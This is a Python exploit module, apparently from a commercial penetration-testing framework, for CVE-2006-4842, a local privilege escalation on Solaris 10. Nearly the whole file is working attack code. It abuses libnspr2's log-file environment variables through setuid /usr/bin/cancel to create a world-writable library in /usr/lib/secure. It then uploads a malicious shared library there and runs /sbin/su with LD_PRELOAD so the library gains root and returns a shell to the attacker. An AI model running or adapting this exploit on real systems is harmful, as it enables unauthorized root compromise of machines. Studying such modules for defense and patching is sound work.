#!/usr/bin/env python

# libnspr2 does not check the write location
# for its logfiles, which allows you to create
# world writeable files in any location
# e.g. /usr/lib/secure/ which allows for
# LD_PRELOAD abuse on setuid root binaries

# gcc -fPIC -Wall -g -O2 -shared -o mosdef_reexec_sol10_intel.so libs/solroot/mosdef_reexec_shared.c -lc -lsocket -static-libgcc -D_SOL_INTEL

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

NAME                                = 'CVE-2006-4842: libnspr2'
VERSION                             = '1.0'
DESCRIPTION                         = 'Local privilege escalation for Solaris 10'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'Sun'
DOCUMENTATION['Repeatability']      = 'unlimited'
DOCUMENTATION['VersionsAffected']   = '10'
DOCUMENTATION['CVE Name']           = 'CVE-2006-4842'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4842'
DOCUMENTATION['CVSS'] = 3.6

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['Solaris', 'i386'] ]
PROPERTY['VERSION']                 = [ '10' ]

class CVE_2006_4842:
    def __init__(self, parent):
        self.description    = 'libnspr2 env mishandling local root'
        self.t_path         = ''
        self.l_path         = '/usr/lib/secure/mosdef.so'
        self.s_path         = '/tmp/.tmp'
        # XXX: figure this out from node ...
        self.target         = 'sol10_intel'
        self.log            = parent.log
        return
    
    # script that creates a world writeable /usr/lib/secure/mosdef.so
    def getscript(self):
        script = """#!/bin/sh
NSPR_LOG_MODULES=all:5
NSPR_LOG_FILE=%s
export NSPR_LOG_MODULES NSPR_LOG_FILE
umask 0
/usr/bin/cancel\n""" % self.l_path
        return script
    
    def getlib(self):
        """ read the local mosdef reexec library """
        # lib expects MOSDEFD=yourfd in environment
        # lib then does setuid(0)
        # lib then does mosdef loop
        libs                = {}
        path                = 'libs' + os.sep + 'solroot' + os.sep
        libs['sol10_intel'] = path + 'mosdef_reexec_sol10_intel.so'      

        try:
            return open(libs[self.target]).read()
        except IOError:
            self.log('[-] could not read library ...')
        except KeyError:
            self.log('[-] do not have library for target %s ...' % target)
        return None
        
    def putfile(self, node, data, filename):
        """ upload file to node """
        O_RDWR      = node.shell.libc.getdefine('O_RDWR')
        O_CREAT     = node.shell.libc.getdefine('O_CREAT')

        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if fd < 0:
            self.log('[-] could not open %s ...' % filename)
            return 0
        self.log('[+] %s opened as fd=%d' % (filename, fd))
        r = node.shell.write(fd, data)
        if r != 1:
            self.log('[-] write failed ...')
            return 0
        self.log('[-] file wrote successfully')
        r = node.shell.close(fd);
        if r == -1:
            self.log('[-] error while trying to close the fd')
        return 1
    
    def exploit(self, node):
        """ trigger the mosded reexec execve """
        
        # get world writeable secure lib
        self.log('[+] trying to get world writeable secure lib')
        r = self.putfile(node, self.getscript(), self.s_path)
        if not r:
            return False
        node.shell.runcommand(self.s_path)
        node.shell.unlink(self.s_path)
        
        # write secure lib
        self.log('[+] writing secure lib')
        libdata = self.getlib()
        if not libdata:
            return False
        r = self.putfile(node, libdata, self.l_path)
        if not r:
            return False
        
        vars                = {}
        vars['MOSDEFD']     = "MOSDEFD=%d" % node.shell.fd
        vars['NODEFD']      = node.shell.fd
        vars['LD_PRELOAD']  = "LD_PRELOAD=%s" % self.l_path
        vars['TARGET']      = '/sbin/su'
        
        code                =   """
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "wait" as "wait"
        #import "local", "getpid" as "getpid"
        #import "local", "poll" as "poll"
        #import "local", "_exit" as "_exit"
        
        #include <sys/poll.h>
        
        #import "string", "LD_PRELOAD" as "LD_PRELOAD"
        #import "string", "TARGET" as "TARGET"
        #import "string", "MOSDEFD" as "MOSDEFD"

        #import "int", "NODEFD" as "NODEFD"
        
        int
        main()
        {
            char *exec[2];
            char *env[3];
            int pid;
            int ppid;
            int status;
            struct pollfd fds;
            int ret;
            
            exec[0] = TARGET;
            exec[1] = 0;
            
            env[0] = MOSDEFD;
            env[1] = LD_PRELOAD;
            env[2] = 0;
         
            sendint(0);
            
            ppid = getpid();
            pid  = fork();
            
            // solaris fork, wack.
            if (pid != ppid)
            {
                // wait for child 
                fds.fd      = NODEFD;                               
                fds.revents = 0; 
                fds.events  = 0;
                status      = 1;
                // we use poll as a sleep
                poll(&fds, 1, 1000);
                
                ret = wait(&status);
            }
            else
            {
                // exploit
                execve(exec[0], exec, env);
                _exit(0);
            }
        }
        """
        
        try:
            self.log('[+] exploiting ...')
            node.shell.runCode(code, vars)
        except:
            self.log("something bad happened!")
            import traceback
            traceback.print_exc(file=sys.stdout)
            return False
        
        self.log('[+] returning node')
        return node
    
class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name               = "SOLrooter exploit"
        
    def run(self):
        self.log("*** this module is used from within the SOLrooter ***")
        return False
    
